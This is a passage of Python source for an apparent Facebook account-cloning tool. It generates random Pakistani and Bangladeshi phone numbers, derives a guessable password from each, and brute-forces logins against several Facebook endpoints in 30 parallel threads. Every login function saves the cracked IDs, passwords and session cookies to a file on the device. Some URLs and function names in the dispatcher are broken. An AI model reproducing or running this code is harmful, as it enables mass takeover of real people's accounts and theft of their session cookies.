            'schem': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            # 'cookie': 'sb=aslQZLtk8VsQxXCA6TvDyuiT; wd=980x1868; datr=aslQZOgdefpuVJy0dXvz9sVZ; dpr=1.75; fr=0VgDpF1bPoNF7Rmes..BkUMlq.dF.AAA.0.0.BkUMmT.AWXfH2PD-WE',
            'referer': 'https://www.google.com/',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
}
            lo = session.post('https://web.facebook.com/login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
#____[M6-M Facebook]_____#        
def MUNNI(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M6\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'm.facebook.com',
           'method': 'GET',
           'schem': 'https',
           'accept': '*/*',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'content-type': 'application/x-www-form-urlencoded',
           # 'cookie': 'sb=aslQZLtk8VsQxXCA6TvDyuiT; datr=aslQZOgdefpuVJy0dXvz9sVZ; dpr=1.75; m_pixel_ratio=1.75; wd=412x785; fr=0VgDpF1bPoNF7Rmes..BkUMlq.dF.AAA.0.0.BkUPV6.AWW4KL5deFA',
           'origin': 'https://m.facebook.com',
           'referer': 'https://m.facebook.com/?_rdr',
           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A037F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
           'x-asbd-id': '198387',
           'x-fb-lsd': 'AVomoYcSNjw',
}
            lo = session.post('https://m. facebook.con/login/ device-based/login/async/?refsrc=deprecated&ht_token=Abt01 P3iph-HMna80FUEi899sHakvUDR Ih6AFJd IFPFFA8M28h_consent=1äht_I=login& Iwv=1 00',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
#____[M6-M Facebook]_____#        

#_________Random Bd Pk________#       
def habibi():
    user=[]
    os.system('clear')
    print(logo)
    print(' \033[38;5;195m[•] \033[1;96mPK CODE EXAMPLE : \033[1;92m+92300\033[38;5;195m/\033[1;92m+92301\033[38;5;195m/\033[1;92m+92304\033[38;5;195m/\033[1;92m+92305')
    print(' \033[38;5;195m[•] \033[1;96mBD CODE EXAMPLE : \033[1;92m+88017\033[38;5;195m/\033[1;92m+88019\033[38;5;195m/\033[1;92m+88018\033[38;5;195m/\033[1;92m+88016')
    print(balpakna)
    ha = input(' \033[38;5;195m[•] \033[1;96mCHOICE SIM CODE : \033[1;92m')
    os.system('clear')
    print(logo)
    print(" \033[1;97m[1] \033[1;94mMATHOID \033[1;93m[ X ] \n \033[1;97m[2] \033[1;94mMATHOID \033[1;93m[P] \n \033[1;97m[3] \033[1;94mMATHOID \033[1;93m[Free] \n \033[1;97m[4] \033[1;94mMATHOID \033[1;93m[Mbasic] \n \033[1;97m[5] \033[1;94mMATHOID \033[1;93m[Web] \n \033[1;97m[6] \033[1;94mMATHOID \033[1;93m [M] ")
    print(balpakna)
    ha = input(' \033[38;5;195m[•] \033[1;96m CHOICE MATHOID \033[1;97m: \033[1;92m')
    nabil=[]
    if ha in ['1', '01']:
    	nabil.append('M1')
    elif ha in ['2', '02']:
    	nabil.append('M2')
    elif ha in ['3', '03']:
    	nabil.append('M3')
    elif ha in ['4', '04']:
    	nabil.append('M4')
    elif ha in ['5', '05']:
    	nabil.append('M5')
    elif ha in ['6', '06']:
    	nabil.append('M6')
    else:
    	nabil.append('M1')
    os.system('clear')
    print(logo)
    print(' \033[38;5;195m[•] \033[1;96mEXAMPLE : \033[1;92m10000\033[38;5;195m/\033[1;92m20000\033[38;5;195m/\033[1;92m30000\033[38;5;195m/\033[1;92m50000 ')
    print(balpakna)
    limit = int(input(' \033[38;5;195m[•] \033[1;96mCLONING LIMIT : \033[1;92m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(balpakna)
        kadija=nabil[0]
        print(' \033[38;5;195m[•]\033[1;92m MATHOID\033[1;95m          :\033[1;97m '+kadija)
        print(' \033[38;5;195m[•]\033[1;92m COUNTRY\033[1;95m          : \033[1;97m'+desh)
        print(f" \033[38;5;195m[•] \033[1;92mIP ADDRES        \033[1;95m: \033[1;97m"+ip)
        #print(f' \033[38;5;195m[•] \033[1;92mOPARETIOR NAME   \033[1;95m: \033[1;97m'+sanjida)
        print(f' \033[38;5;195m[•] \033[1;92mCLONING LIMIT   \033[1;95m : \033[1;97m'+tl)
        print(f' \033[38;5;195m[•] \033[1;92mCHOICE SIM CODE \033[1;95m : \033[1;97m'+ha)
        print(f' \033[38;5;195m[•] \x1b[1;91mUSE AIRPLANE MODE FOR BETTER RESULT')
        print(balpakna)
        for love in user:
            uid = ha+love
            pwx = [love[2:]]
            if 'M1' in nabil:
            	asha.submit(XBJ,uid,pwx,tl)
            elif 'M2' in nabil:
            	asha.submit(TAKLIMA,uid,pwx,tl)
            elif 'M3' in nabil:
            	asha.submit(SEX,uid,pwx,tl)
            elif 'M4' in nabil:
            	asha.submit(JANNATUL,uid,pwx,tl)
            elif 'M5' in nabil:
            	asha.submit(SADIN,uid,pwx,tl)
            elif 'M6' in nabil:
            	asha.submit(MUNI,uid,pwx,tl)
            else:
            	asha.submit(XUDI,uid,pwx,tl)
    #print(balpakna)
    #print(' [✓] WORK IS DONE BABE')
    #print(' [✓] Ids saved in HASAN-OK.txt,-CP.txt')
    #print(balpakna)
    
#____[M1-X Facebook]_____#        
def XBJ(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M1\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'x.facebook.com',
           'method': 'POST',
           'schem': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'cache-control': 'max-age=0',
           # 'cookie': 'datr=DbJLZFsoedfHBjoXrVVhFaqA; sb=DrJLZEXL1PMnIATqvp193BBX; m_pixel_ratio=1.75; wd=412x785; fr=0iOw3v2JbxPiwH2Jk..BkS7IN.rA.AAA.0.0.BkS7Le.AWVFhJzwA_c',
           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
#____[M2-p Facebook]_____#        
def TAKLIMA(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M2\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'p.facebook.com',
           'method': 'POST',
           'schem': 'https',
           'accept': '*/*',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'content-type': 'application/x-www-form-urlencoded',
           # 'cookie': 'datr=ULBQZOq4O4vkj1LFZs-XzTn1; sb=ULBQZMfuCJJx0lCgGuUlV4zg; m_pixel_ratio=1.75; sfiu=AYhuILXKOO7Ht-c87qiCCnh6cLZlUXPKkH-ld4Dv3r9NadPc7ApwR3naYd4PGAkexnDHlr8_ZRgp_HFJcQYa6_NjrwglFDHC2nvfmtSuR_vDqNSaZR5hYE7n2J1ZBOBKRyl5iz2xSC0bzI6IBG7g2dExmWo5U1uncR2lyDoLoF8L2iBmhhocvfhzxz8dovL1ytWzZXwsOaHhS1SscApNRU9qoOH5YwdD_8Wb671fosCDEw; wd=412x785; x-referer=eyJyIjoiLyIsImgiOiIvIiwicyI6InAifQ%3D%3D; fr=0pDrj7bNh6Yx8ears..BkULBQ.mP.AAA.0.0.BkULHh.AWUiPDdsjd8',
           'origin': 'https://p.facebook.com',
           'referer': 'https://p.facebook.com/',
           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-platform': '"Windows"',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5629.220 Safari/537.36',
           'x-asbd-id': '198387',
           'x-fb-lsd': 'AVrnx9O0Ff0',
           'x-requested-with': 'XMLHttpRequest',
           'x-response-format': 'JSONStream',
}
            lo = session.post('https://p. facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=1 00',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass

#____[M3-free Facebook]_____#        
def SEX(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M3\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'free.facebook.com',
          'method': 'GET',
          'schem': 'https',
          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
          'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
          'cache-control': 'max-age=0',
          # 'cookie': 'datr=ULBQZOq4O4vkj1LFZs-XzTn1; sb=ULBQZMfuCJJx0lCgGuUlV4zg; m_pixel_ratio=1.75; sfiu=AYhuILXKOO7Ht-c87qiCCnh6cLZlUXPKkH-ld4Dv3r9NadPc7ApwR3naYd4PGAkexnDHlr8_ZRgp_HFJcQYa6_NjrwglFDHC2nvfmtSuR_vDqNSaZR5hYE7n2J1ZBOBKRyl5iz2xSC0bzI6IBG7g2dExmWo5U1uncR2lyDoLoF8L2iBmhhocvfhzxz8dovL1ytWzZXwsOaHhS1SscApNRU9qoOH5YwdD_8Wb671fosCDEw; x-referer=eyJyIjoiLyIsImgiOiIvIiwicyI6InAifQ%3D%3D; wd=412x785; fr=0pDrj7bNh6Yx8ears..BkULBQ.mP.AAA.0.0.BkUMSe.AWXL7O3xDFg',
          'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Linux"',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'none',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1',
          'user-agent': 'Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5618.199 Safari/537.36',
}
            lo = session.post('https://www.facebook.com/login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass

#____[M4-mbasic Facebook]_____#        
def JANNATUL(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M4\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'mbasic.facebook.com',
           'method': 'GET',
           'schem': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'cache-control': 'max-age=0',
           # 'cookie': 'datr=ULBQZOq4O4vkj1LFZs-XzTn1; sb=ULBQZMfuCJJx0lCgGuUlV4zg; m_pixel_ratio=1.75; sfiu=AYhuILXKOO7Ht-c87qiCCnh6cLZlUXPKkH-ld4Dv3r9NadPc7ApwR3naYd4PGAkexnDHlr8_ZRgp_HFJcQYa6_NjrwglFDHC2nvfmtSuR_vDqNSaZR5hYE7n2J1ZBOBKRyl5iz2xSC0bzI6IBG7g2dExmWo5U1uncR2lyDoLoF8L2iBmhhocvfhzxz8dovL1ytWzZXwsOaHhS1SscApNRU9qoOH5YwdD_8Wb671fosCDEw; x-referer=eyJyIjoiLyIsImgiOiIvIiwicyI6InAifQ%3D%3D; wd=412x785; fr=0pDrj7bNh6Yx8ears..BkULBQ.mP.AAA.0.0.BkULeV.AWUjv1vsACU',
           'referer': 'https://mbasic.facebook.com/login/?email=01762628196&li=Zr5QZBb8ZO43c6pDhNHUdUmn&e=1348028&shbl=1&refsrc=deprecated&_rdr',
           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-platform': '"Linux"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'same-origin',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/114.0.5660.215 Chrome/114.0.5660.215 Safari/537.36',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass

#____[M5-web Facebook]_____#        
def SADIN(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M5\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://www.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'web.facebook.com',
           'method': 'GET',
           'schem': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'cache-control': 'max-age=0',
           # 'cookie': 'sb=aslQZLtk8VsQxXCA6TvDyuiT; wd=980x1868; datr=aslQZOgdefpuVJy0dXvz9sVZ; dpr=1.75; fr=0VgDpF1bPoNF7Rmes..BkUMlq.dF.AAA.0.0.BkUMmT.AWXfH2PD-WE',
           'referer': 'https://www.google.com/',
           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'cross-site',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
}
            lo = session.post('https://web.facebook.com/login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[HASAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                print(f" \x1b[1;32m[NUMBAR]\033[38;5;45m> {uid} ")
                print(f" \x1b[1;32m[CREACT DATE]\033[38;5;45m> '+samiya(uid)+'\033[1;92m")
                print(f" \033[1;92m[COOKIES]\033[38;5;45m> \033[1;96m{coki}")
                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[HASAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/HASAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass

#____[M6-M Facebook]_____#        
def MONI(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mHASAN-M6\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'm.facebook.com',
           'method': 'GET',
           'schem': 'https',
           'accept': '*/*',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'content-type': 'application/x-www-form-urlencoded',
           # 'cookie': 'sb=aslQZLtk8VsQxXCA6TvDyuiT; datr=aslQZOgdefpuVJy0dXvz9sVZ; dpr=1.75; m_pixel_ratio=1.75; wd=412x785; fr=0VgDpF1bPoNF7Rmes..BkUMlq.dF.AAA.0.0.BkUPV6.AWW4KL5deFA',
           'origin': 'https://m.facebook.com',
           'referer': 'https://m.facebook.com/?_rdr',
           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
           'sec-ch-ua-mobile': '?1',
